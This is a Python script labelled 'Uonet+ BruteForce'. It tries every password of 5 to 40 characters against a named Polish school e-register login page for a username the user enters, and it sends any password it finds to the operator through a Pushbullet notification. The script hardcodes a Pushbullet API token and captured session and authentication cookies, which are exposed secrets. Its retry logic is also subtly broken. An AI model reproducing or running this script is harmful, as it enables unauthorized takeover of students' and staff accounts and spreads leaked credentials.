import requests, sys, string, time, os, threading, random
from itertools import product
from colorama import Fore
from pushbullet import PushBullet

pb = PushBullet("o.5HE8nNNQqkd7m0TTxxyXzCDIpfpBdd7D")

def clear():

    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try again\n\t--------------------------------------''')
    sys.exit()

url = "https://cufs.vulcan.net.pl/nowydwormazowiecki/Account/LogOn?ReturnUrl=%2Fnowydwormazowiecki%2FFS%2FLS%3Fwa%3Dwsignin1.0%26wtrealm%3Dhttps%253A%252F%252Feduone.pl%252Fnowydwormazowiecki%252FLoginEndpoint.aspx%26wctx%3Dhttps%253A%252F%252Feduone.pl%252Fnowydwormazowiecki%252FLoginEndpoint.aspx"

clear()

cookies = {
    'ASP.NET_SessionId': 'qrxjbmyfk4wf1lxff31aelw5',
    'ARR_cufs.vulcan.net.pl': '7d7299476a8f6362149a79df6644620d5ee4f8ae9824c7408dc9d79f9be4f109',
    'ARR_3S_ARR_CufsEOL': '2e3769da8582dbfb4329229e07f39dfc239c5dadaed2025735d8f6ed96752a95',
    'UonetPlus_SLACookie': '638133672030871800',
    'efebCookieReaded': '1',
    'FederatedApplicationf567c2a9-62d2-4294-9899-5a88e0ca3c6d': 'https://eduone.pl/nowydwormazowiecki/LoginEndpoint.aspx',
    'FederatedApplication2cbcc4de-0143-4f93-b4a7-3210268bbbe4': 'https://uonetplus.vulcan.net.pl/nowydwormazowiecki/LoginEndpoint.aspx',
    'EfebSsoAuthCookie': 'qML9MyMykyKHqjQQNx-UIhuzNhBbWzVt-2PyJswUE4gsQKPX_VcFeYi7WA2nTcY8TamDTeuU3GGaV93yJH6oxPzCwfna4G18vB_b0s2E2rQxHjus7e5FeYvtxSQqrctRK7yymM2FGizgRP7nL0jrRExO7aLxr-Is-ha66fYf3OGBF1q1QUgOJ9Er3hscm5ygsHzWapJAHiHpbYqQOuaHFn_mX3q_A7cg5iRJWGztNV_NlR8aUwpsaM8VXpyRrmxD6rClbGJhiXOJpVYQT1v3OWC3L0lUXUc31xSiVbcaP41RSPTZ6AN6dN_hD27PK5ZvP6T1ObaQjQuUULKAIwjRrYSRuLi77Ad0zWSzhpeIuOB6aVrT6rdDLPjq2jkoxMIDYebmzIHUVG65Wab0E0rMSS16-Jz0qc8urjqJyutfiOuUDCnvRA~~',
    'UonetPlus_ASP.NET_SessionId': 'gr23c52rsplpge0dlp1hz2ci',
    'Vulcan.CUFS.WebFrontEndCookie': '77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48U2VjdXJpdHlDb250ZXh0VG9rZW4gcDE6SWQ9Il8xOThlMzE2My0yMjFlLTRkMTYtOTJiNC1mNTgxNjI5MjRkYzEtMDIyNUU2RTkwODkwQjI0NDNBMUY0RUNBQTJCNEMzNEMiIHhtbG5zOnAxPSJodHRwOi8vZG9jcy5vYXNpcy1vcGVuLm9yZy93c3MvMjAwNC8wMS9vYXNpcy0yMDA0MDEtd3NzLXdzc2VjdXJpdHktdXRpbGl0eS0xLjAueHNkIiB4bWxucz0iaHR0cDovL2RvY3Mub2FzaXMtb3Blbi5vcmcvd3Mtc3gvd3Mtc2VjdXJlY29udmVyc2F0aW9uLzIwMDUxMiI+PElkZW50aWZpZXI+dXJuOnV1aWQ6YTBjMTdjZmItNzBhNy00YTY3LTg5NjktNmIwMWI3YzQzMjI5PC9JZGVudGlmaWVyPjxDb29raWUgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwNi8wNS9zZWN1cml0eSI+SjNmNkdXWEFKWXdlTXNoczRQUEJmRmc1N0E0OFd2M0kzRGlWWXBHQU5WSVVJLzlMeDNWSndyWkR3M3EyNkYwSm0yaURLMWR0MGRnd2hWTC9lYk5FbEtRYzhMS1hycjdNbXhtVGR0SnZwd0JyaFY2a1ZkNndTMlhTUEtrekxRM2V5eThLWU5YNTd0OEJISFRqVVJPU3YxcVFTVE9yY0h1eHpWODdZVnRZSHRDVGJQTXBIUFJTUTZHZkpoV0RySWJvSEp3cHBDK1hQNGh5aWJqOHo4LzlCcEN0cU1obVQveXlibTB4M0xKdjMremt1NSttVXhXbm5FL1BJakdxbWpDV2JZeEcvWk9DbXdnRXFkUHkxc2dWZ3FyT0lKOW4yZG5oN3NWcW9rSjBMU1p2NWlVclliT215Q0Y3R1oyRHkxWjFXc0wzNUI2WmZnZ04xUGdWSWU5YStPVE93QVhKdjZ3N2k1dyt0azc2blk4Z3gwQ2hZREFjOStTREhUR1pYckxoNE1sM3JibzRpR1ZQaTZOMFlNeFhvMEFyK0sweVpSS00wZ1VUYzdVb0VWWnM2Z0RXNHJrZEZ3UUdzTkx4NmwxRlhFWkVwMytuUEZ4MjR6NjNsRU9yWkY4RlhwcldSdVYyR3EyMnVQRlMxbkV6TEZ1UHRhM2dPUS94bkhsUWFWMUppVStUS3dNMWVOVm9xVm5QTjgzaXRGRWxsU3ZVOUhTU3ZobFZMeExJb0lBUlEvc1hoQXZkNkl4K2tIRkpqdFdMZGx1YzNQUlJjUVJHTS83ZjBuUGxFdEZRdXVhQzk1b1BjWG1RWTRsa2t4QnhVZE5hQnFkbElDVlZQM1hJeUNqZVpzUlNOZlVmMTBTaFd6Z1lxZXJSOTRWMURUNmJSNC9WK2FWd0pNd3JNS3I1L3JTVndQZ2U5NW5LZi9JQVBJeW1qeEZ2NDlhMG9sWTQxNkdNRGYwYTYrbjVXQTk4RXZCUlNZSjRnbDdYaG93TW9FSG1UdmFNamNBaDlFeXpPTzlGU0pDRVZNME5aMXZ2bDBicGF2OGNDQVhqN3VVZzNRajRMODhWMlk4QVdxcWhVbDVZOGlrWDZSWkVZSW9tdzd3WmRsTGZXdGx6aEpaNHlQcFIyS2JsaGx6WEc4NzNqbWMrUFVpUCtHQnZTWVZONnF0ZmpRaFFtYU4rYUdXTlpaNzNPbDVLcXpxQWpGWVRmYW5qcVZNMnhtc05yaFU9PC9Db29raWU+PC9TZWN1cml0eUNvbnRleHRUb2tlbj4=',
}

headers = {
    'authority': 'cufs.vulcan.net.pl',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7,en-AU;q=0.6,en-NZ;q=0.5,nl;q=0.4',
    'cache-control': 'max-age=0',
    'origin': 'https://cufs.vulcan.net.pl',
    'referer': 'https://cufs.vulcan.net.pl/nowydwormazowiecki/Account/LogOn?ReturnUrl=%2Fnowydwormazowiecki%2FFS%2FLS%3Fwa%3Dwsignin1.0%26wtrealm%3Dhttps%253A%252F%252Feduone.pl%252Fnowydwormazowiecki%252FLoginEndpoint.aspx%26wctx%3Dhttps%253A%252F%252Feduone.pl%252Fnowydwormazowiecki%252FLoginEndpoint.aspx',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

params = {
    'ReturnUrl': '/nowydwormazowiecki/FS/LS?wa=wsignin1.0&wtrealm=https%3A%2F%2Feduone.pl%2Fnowydwormazowiecki%2FLoginEndpoint.aspx&wctx=https%3A%2F%2Feduone.pl%2Fnowydwormazowiecki%2FLoginEndpoint.aspx',
}

character = string.ascii_letters + "ąćęłńóśźżĄĆĘŁŃÓŚŻŹ" + string.digits + string.punctuation

def is_this_a_password(email, password):
    data = {
        'LoginName': f'{email}',
        'Password': f'{password}',
    }
    try:
        r = requests.post(
            'https://cufs.vulcan.net.pl/nowydwormazowiecki/Account/LogOn',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data
        )
        if "<title>Working...</title>" in r.text:
            return True
        return False
    except:
        time.sleep(1)
        is_this_a_password(email, password)

if __name__ == "__main__":
    print('\n---------- Welcome To Uonet+ BruteForce ----------\n')
    email = input('Enter Email/Username to target: ').strip()
    min = 5
    max = 40
    t = time.time()
    while True:
        try:
            for index in range(min, max+1):
                for j in product(character, repeat=index):
                    password = "".join(j)
                    if is_this_a_password(email, password):
                        print(f"{Fore.GREEN}Password Found: ", password + Fore.RESET)
                        push = pb.push_note("PASSWORD FOUND!", f"The Password For {email} = {password}")
                        input()
                        exit()
                    else:
                        print(f"{Fore.RED}Password Tried: ", password + Fore.RESET)
            push = pb.push_note("Password Not Found", "Password Was Not Found!")
        except:
            time.sleep(5*60)
